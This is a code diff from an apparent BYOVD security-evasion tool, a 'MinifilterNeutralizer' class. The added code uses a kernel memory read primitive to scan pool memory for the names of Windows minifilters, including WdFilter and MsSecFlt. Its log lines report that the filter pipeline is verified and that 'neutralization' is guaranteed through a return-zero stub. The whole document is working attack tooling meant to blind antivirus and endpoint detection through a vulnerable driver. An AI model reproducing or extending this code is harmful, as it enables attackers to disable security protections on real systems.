@@ -3814,6 +3814,49 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
         }
         ByovdDiag("\n");
 
+        // ★ BUILD 481: 直接在池内存中搜索已知 minifilter 名称 (WCHAR)
+        //   相对于结构遍历, 字符串扫描更可靠 — 不依赖结构偏移假设
+        //   扫描范围: poolFrame-0x5000 ~ poolFrame+0x5000
+        static const wchar_t* knownFilters[] = {
+            L"FileInfo", L"WdFilter", L"luafv", L"wcifs",
+            L"bindflt", L"storqosflt", L"CldFlt", L"bfs",
+            L"RsFx", L"MsSecFlt", L"Wof", L"DfsrRo",
+        };
+        static const int kfCount = sizeof(knownFilters) / sizeof(knownFilters[0]);
+
+        ByovdDiag("FLT:VERIFY:   Pool string scan around FLTP_FRAME[%d] (±0x5000)...\n", qi);
+        int strHits = 0;
+        for (int64_t sOff = -0x5000; sOff < (int64_t)0x5000 && strHits < 16; sOff += 16) {
+            uint64_t sAddr = poolFrame + sOff;
+            if (sAddr < 0xFFFF800000000000ULL) continue;
+            uint8_t chunk[128] = {};
+            if (!kma.ReadKernelVA(sAddr, chunk, sizeof(chunk))) continue;
+            for (int k = 0; k < kfCount; k++) {
+                size_t wlen = wcslen(knownFilters[k]);
+                size_t byteLen = wlen * 2;
+                for (int b = 0; b <= (int)(128 - byteLen); b++) {
+                    bool match = true;
+                    for (size_t w = 0; w < wlen; w++) {
+                        wchar_t c1 = *(wchar_t*)(chunk + b + w * 2);
+                        wchar_t c2 = knownFilters[k][w];
+                        if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
+                        if (c2 >= L'A' && c2 <= L'Z') c2 += 32;
+                        if (c1 != c2) { match = false; break; }
+                    }
+                    if (match) {
+                        ByovdDiag("FLT:VERIFY:   [!] FOUND '%ls' string at 0x%llX (FLTP_FRAME%+lld)\n",
+                            knownFilters[k], (unsigned long long)(sAddr + b),
+                            (long long)(sAddr + b - poolFrame));
+                        strHits++;
+                        break;
+                    }
+                }
+                if (strHits >= 16) break;
+            }
+        }
+        if (strHits == 0)
+            ByovdDiag("FLT:VERIFY:   No known minifilter strings found in pool scan (±0x5000)\n");
+
         // 扫描 LIST_ENTRY 候选 (0x000 ~ 0xFF8, step 8)
         int localCandidates = 0;
         for (int off = 0; off < 0x1000; off += 8) {
@@ -3891,7 +3934,7 @@ bool MinifilterNeutralizer::VerifyFltPipeline() {
     ByovdDiag("FLT:VERIFY: ========================================\n");
     ByovdDiag("FLT:VERIFY: RESULT: PASS (%d/%d checks)\n", checksPassed, checksTotal);
     ByovdDiag("FLT:VERIFY: === PIPELINE VERIFIED ===\n");
-    ByovdDiag("FLT:VERIFY: | FltGlobals → FrameList → FilterList (%d filters) → ret0 stub |\n", filterCount);
+    ByovdDiag("FLT:VERIFY: | FltGlobals → FrameList → FilterList (%d filters) → ret0 stub |\n", bestFilterCount);
     ByovdDiag("FLT:VERIFY: | When MessageTransfer.sys loads: neutralization GUARANTEED |\n");
     ByovdDiag("FLT:VERIFY: ========================================\n");
 
